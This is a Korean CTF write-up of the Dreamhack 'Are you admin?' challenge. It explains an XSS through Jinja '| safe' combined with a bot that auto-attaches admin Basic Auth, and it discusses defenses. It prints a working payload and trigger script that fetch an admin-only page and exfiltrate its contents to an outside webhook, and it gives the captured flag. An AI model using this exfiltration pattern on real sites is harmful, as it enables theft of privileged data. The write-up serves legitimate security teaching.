---
layout: post
title:  "Dreamhack 워게임 Are you admin? 풀이 — Jinja | safe + Selenium 봇의 Basic Auth로 XSS → flag"
date:   2026-05-16 12:30:00 +0900
categories: security web wargame dreamhack writeup xss flask
---

## 들어가며

Dreamhack 웹해킹 워게임 **Are you admin?** (난이도 Bronze 1) 풀이입니다. 사이버보안 입문 학생에게 **"`| safe` 한 글자가 어떻게 RCE 급 피해로 이어지는지"** 를 보여주는 교과서 같은 XSS 문제입니다.

문제 설명:

> Hmm... You look suspicious. Are you admin?

스포일러로 결론:

```bash
PAYLOAD="<script>fetch('/whoami').then(r=>r.text()).then(t=>fetch('https://WEBHOOK/aya/?'+btoa(t)))</script>"
PATH="/intro?name=$(python3 -c 'import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")&detail=x"
curl -X POST "$SERVER/report" --data-urlencode "path=$PATH"
# → webhook 에 admin Basic Auth 가 붙은 /whoami 응답이 도착 → flag 가 base64 안에
```

핵심 통찰:

1. **`{{ name | safe }}`** — Jinja 가 escape 하지 않음. XSS 1티어 신호.
2. **봇이 Selenium 으로 `Network.setExtraHTTPHeaders` 로 `Authorization: Basic <admin:PASSWORD>`** 를 모든 요청에 자동 첨부.
3. 우리의 XSS 가 `fetch('/whoami')` 를 부르면 봇이 자동으로 admin Auth 헤더 첨부 → `/whoami` 가 flag 반환 → 본문을 webhook 으로 exfil.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

### 1-1. `intro.html` — XSS sink

```html
{% if name and detail %}
    <p>Hello, my name is <strong>{{ name | safe }}</strong>.</p>
    <p>{{ detail }}</p>
{% endif %}
```

`name` 은 `| safe` — Jinja autoescape 우회. HTML 그대로 박힘. `detail` 은 일반 escape 적용. 즉 **XSS 는 `name` 으로**.

### 1-2. `whoami` — flag 저장소

```python
@app.route("/whoami", methods=["GET"])
def whoami():
    authorization = request.headers.get('Authorization')
    if authorization:
        user_info = b64decode(authorization.split('Basic ')[1].encode()).decode()
    else:
        user_info = "guest:guest"
    id_, password = user_info.split(":")
    if id_ == 'admin' and password == PASSWORD:
        return render_template('whoami.html', id=id_, message=FLAG)
    else:
        return render_template('whoami.html', id=id_, message="You are guest")
```

`Authorization: Basic <b64(admin:PASSWORD)>` 헤더가 붙어 있어야 FLAG 가 응답 본문에 박힘. PASSWORD 는 환경 변수 — 우리가 모른다.

### 1-3. `access_page` — 봇이 어떻게 admin 인척 하는가

```python
def access_page(name, detail):
    user_info = f'admin:{PASSWORD}'
    encoded_user_info = b64encode(user_info.encode()).decode()
    ...
    driver = webdriver.Chrome(...)
    driver.execute_cdp_cmd(
        'Network.setExtraHTTPHeaders',
        {'headers': {'Authorization': f'Basic {encoded_user_info}'}}
    )
    driver.execute_cdp_cmd('Network.enable', {})
    driver.get("http://127.0.0.1:8000/")
    driver.get(f"http://127.0.0.1:8000/intro?name={quote(name)}&detail={quote(detail)}")
```

봇은 Chrome 의 CDP 로 **`Authorization: Basic <admin:PASSWORD>` 헤더를 모든 요청에 자동 첨부**. 그리고 `/intro?name=...&detail=...` 으로 우리 페이로드를 들고 방문.

### 1-4. `/report` — 봇 트리거

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        path = request.form.get("path")
        parsed_path = urlparse(path)
        params = parse_qs(parsed_path.query)
        name = params.get("name", [None])[0]
        detail = params.get("detail", [None])[0]
        if access_page(name, detail):
            return render_template("report.html", message="Success")
```

POST `/report` 에 `path=/intro?name=X&detail=Y` 형태로 보내면 봇이 그 페이지 방문. 즉, **우리가 `name` 으로 XSS 페이로드를 박으면 봇 브라우저 안에서 admin Basic Auth 와 함께 그 페이지가 로드됨**.

## 2. 익스플로잇

XSS payload:

```javascript
<script>
  fetch('/whoami')
    .then(r => r.text())
    .then(t => fetch('https://WEBHOOK/aya/?' + btoa(t)))
</script>
```

`fetch('/whoami')` 는 같은 origin (127.0.0.1:8000) 으로 요청 → 봇 Chrome 이 자동으로 admin Authorization 헤더 첨부 → 서버는 admin 으로 인식 → FLAG 가 응답 본문에 박힘 → 본문을 base64 인코딩해서 webhook 으로 fetch.

`btoa` 를 쓰는 이유: HTML 본문에는 `<`, `>`, `=`, `&` 같은 URL 특수문자가 많아 그대로 URL 에 넣기 곤란. base64 로 안전하게 직렬화.

### 2-1. 전체 명령

```python
import urllib.parse, urllib.request

SERVER = "http://<host>:<port>"
WEBHOOK = "https://webhook.site/<UUID>"

payload = ("<script>fetch('/whoami').then(r=>r.text())"
           ".then(t=>fetch('" + WEBHOOK + "/aya/?'+btoa(t)))</script>")
path = "/intro?name=" + urllib.parse.quote(payload) + "&detail=x"

data = urllib.parse.urlencode({'path': path}).encode()
urllib.request.urlopen(
    urllib.request.Request(f"{SERVER}/report", data=data, method='POST'),
    timeout=15)
```

### 2-2. flag 수확

webhook 에 도착한 GET 요청의 query string 을 base64 디코드:

```python
import re, base64
b64data = url.split('?', 1)[1]
decoded = base64.b64decode(b64data + '==').decode('utf-8', 'replace')
print(re.search(r'DH\{[^}]+\}', decoded).group(0))
# → DH{c5c5945ef44c4aae5b331986ca4e46419582b5405f19ebff8cb08bca07f41e4f}
```

flag: `DH{c5c5945ef44c4aae5b331986ca4e46419582b5405f19ebff8cb08bca07f41e4f}` ✓

## 3. 취약점 해설 — `| safe` 와 자동 인증의 잘못된 만남

이 문제의 본질은 **두 개의 잘못된 가정** 이 만나는 것:

> 1. **개발자 가정 1**: 사용자가 입력하는 `name` 은 신뢰할 수 있다 → `| safe` 로 HTML 통과.
> 2. **개발자 가정 2**: 봇이 admin Authorization 을 자동으로 첨부하면 admin 권한이 안전하게 행사된다 → 페이지 안의 모든 fetch 가 admin 권한으로 동작.

두 가정이 합쳐지면 → **공격자가 박은 `<script>` 도 admin 권한으로 fetch 함**.

### 3-1. `| safe` (또는 `dangerouslySetInnerHTML`) 의 함정

거의 모든 템플릿 엔진이 이 패턴을 갖고 있다:

- Jinja: `{{ x | safe }}`
- Django: `{{ x|safe }}` 또는 `{% autoescape off %}`
- React: `dangerouslySetInnerHTML={{__html: x}}`
- Vue: `v-html="x"`

이 디렉티브는 **반드시 sanitize 된 데이터에만** 써야 한다. 사용자 입력에 직접 적용하면 즉시 XSS.

### 3-2. 봇 자동 인증의 위험

이 패턴은 실무에서 정확히 같은 형태로 사고가 난다:

- **SaaS 의 "preview" / "screenshot" 봇** 이 사용자 페이지를 admin 으로 visit 하면, 그 페이지의 어떤 fetch 도 admin 권한.
- **이메일 클라이언트의 미리보기** 가 자동으로 쿠키 첨부하면, 이메일 안의 트래킹 픽셀이 모든 권한.
- **Slack/Discord 의 unfurl 봇** — URL 미리보기 위해 페이지 fetch. 봇의 trust 가 그대로 페이지 안 자원으로 흘러감.

### 3-3. 위험성

- 본 PoC 처럼 단순 GET 요청으로 admin 데이터 노출.
- 더 나아가 admin 의 CSRF 토큰 / API 키 / 세션 ID 등 모두 노출.
- 봇이 GET 뿐 아니라 POST 도 자동으로 admin 권한으로 보낸다면, **admin 권한으로 임의의 상태 변경** (사용자 추가, 권한 변경, 데이터 삭제) 도 가능.

### 3-4. 올바른 방어

1. **`| safe` 절대 금지**. 정말 HTML 을 넣어야 한다면 sanitize 라이브러리 (Bleach, DOMPurify) 로 한 번 정제.

   ```python
   import bleach
   safe_name = bleach.clean(name, tags=[], strip=True)  # all HTML stripped
   ```

2. **봇이 admin 권한으로 visit 한다면 sandbox**:
   - 별도 브라우저 컨테이너에서 실행 (`--user-data-dir=/tmp/bot-X`).
   - **Authorization 헤더는 그 특정 URL 의 origin 에만 첨부**, 그 페이지가 다른 origin/path 로 fetch 할 때는 안 첨부.
   - CDP `Network.setExtraHTTPHeaders` 대신 명시적 origin filter.

3. **CSP 적용**:

   ```
   Content-Security-Policy: default-src 'self'; script-src 'none'; connect-src 'self'
   ```

   `script-src 'none'` 이면 인라인 `<script>` 못 박음. `connect-src 'self'` 이면 외부 webhook 으로 fetch 불가.

4. **admin 권한 endpoint 는 origin/referer 검증** : `/whoami` 가 같은 origin 의 referer 가 있을 때만 응답하게.

5. **HttpOnly + SameSite cookie** 로 세션 보호. (이 문제는 Basic Auth 라 cookie 관련 없음, 하지만 일반적인 권장.)

## 4. 정리 — 입문자가 가져갈 교훈

- **`| safe` / `dangerouslySetInnerHTML` / `v-html`** 가 보이는 순간 즉시 XSS 후보. 코드 리뷰 1번 항목.
- 봇이 자동으로 admin 권한을 첨부하는 패턴은 **clickjacking, XSS, CSRF 모든 클래스의 amplifier**. 봇 trust 를 페이지 안 자원으로 흘리지 말 것.
- 같은 origin 의 페이지 안에서 `fetch('/admin-only-endpoint')` 가 admin 권한으로 통과한다는 사실은 모든 XSS 의 핵심. 그래서 **세션/Auth 헤더의 자동 첨부** 가 보안 모델의 가장 큰 표면.
- HTML 본문을 exfil 할 때는 `btoa()` 로 base64 인코딩이 가장 안전 (URL 특수문자 escape 자동 처리).

같은 카테고리의 다음 단계로 **Guest book** (이미 풀음 — DOM clobbering + RPO), **CSS Injection** (이미 풀음 — clickless XSS via attribute selector), 그리고 **DOM XSS** 정도가 입문자가 거쳐가야 할 XSS 3종 세트.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `| safe` 를 처음에 못 봄

template 의 `{{ name | safe }}` 한 줄을 처음에 그냥 지나쳤다. Bronze 1 난이도라 "단순할 거" 라는 선입견 때문에 `whoami` 의 PASSWORD 를 어떻게 추측할까만 한참 고민. PASSWORD 는 환경 변수라 우리가 알 길이 없다는 걸 깨달은 뒤에야 다시 template 을 보고 `| safe` 발견.

**회고**: 어떤 난이도든 **template 의 `| safe` / `dangerouslySetInnerHTML` 류** 는 1번으로 체크. 한 번 익숙해지면 grep `safe\|dangerouslySetInnerHTML\|v-html` 한 줄로 5초 만에 찾는다.

### 실패 2. POST payload 구성을 헷갈림

`/report` 가 받는 `path` 가 "전체 URL path + query" 인지, "쿼리만" 인지 헷갈림. 소스를 보니 `urlparse(path)` + `parse_qs(parsed_path.query)` — 즉 `/intro?name=...&detail=...` 같은 path+query 형태가 정답.

**회고**: 봇 트리거 endpoint 가 입력으로 받는 파라미터의 형식을 항상 소스 정독해서 정확히 알자. 추측은 시간 낭비.

### 실패 3. webhook 데이터 디코딩에서 base64 padding 빠뜨릴 뻔

`btoa(t)` 의 결과를 URL 에 그대로 박았더니, webhook 에서 받을 때 마지막 `==` padding 이 누락된 짧은 string. Python `base64.b64decode` 는 `==` padding 이 정확해야 한다. 해결: `b + '=='` 로 항상 충분한 padding 추가 (Python 은 초과 padding 은 무시).

**회고**: base64 디코딩 시 padding 누락은 흔한 함정. `b64decode(data + '==')` 가 항상 안전.

### 실패 4. webhook URL display 에서 `_` / `?` 가 base64 의 `/` / `+` 대체인지 잠시 헷갈림

webhook.site 의 URL 표시가 일부 chars 를 안전한 chars 로 보여주는 것처럼 보였지만, 실제로는 raw 그대로. 처음에 URL-safe base64 (`urlsafe_b64decode`) 와 standard base64 (`b64decode`) 둘 다 시도 — standard 가 맞았다.

**회고**: webhook 도구의 display 가 raw 인지 transformed 인지 헷갈리면 그냥 두 디코더 모두 try. fallback 코드가 항상 안전:

```python
for fn in (base64.b64decode, base64.urlsafe_b64decode):
    try:
        decoded = fn(b + '==').decode()
        if decoded: break
    except: pass
```
